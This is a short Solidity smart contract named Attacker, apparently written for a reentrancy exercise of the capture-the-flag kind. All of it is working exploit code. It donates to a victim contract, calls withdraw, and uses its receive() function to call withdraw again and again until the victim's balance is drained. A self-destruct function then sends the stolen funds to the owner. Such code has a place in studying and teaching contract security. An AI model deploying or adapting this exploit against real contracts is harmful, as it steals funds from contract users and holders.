// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker{

    address victim;
    address owner;
    uint amount = 1000000000000000; // Amount to send and withdraw (total value in the contract to hack)

    constructor(address _victim) {
        victim = _victim;
        owner = msg.sender;
    }
  
    bytes4 constant DONATE = bytes4(keccak256('donate(address)'));
    bytes4 constant WITHDRAW = bytes4(keccak256('withdraw(uint256)'));

    function attack() external payable {
        (bool donate, ) = victim.call{value: amount}(abi.encodeWithSelector(DONATE, address(this)));
        require(donate);
        (bool withdraw, ) = victim.call(abi.encodeWithSelector(WITHDRAW, amount));
        require(withdraw);
    }

    receive() external payable {
        if(address(victim).balance > 0) {
            (bool withdraw, ) = victim.call(abi.encodeWithSelector(WITHDRAW, amount));
            require(withdraw);
        }
    }

    function kill () external {
        require(msg.sender == owner, "You are not the owner");
        selfdestruct(payable(msg.sender));
    }

}
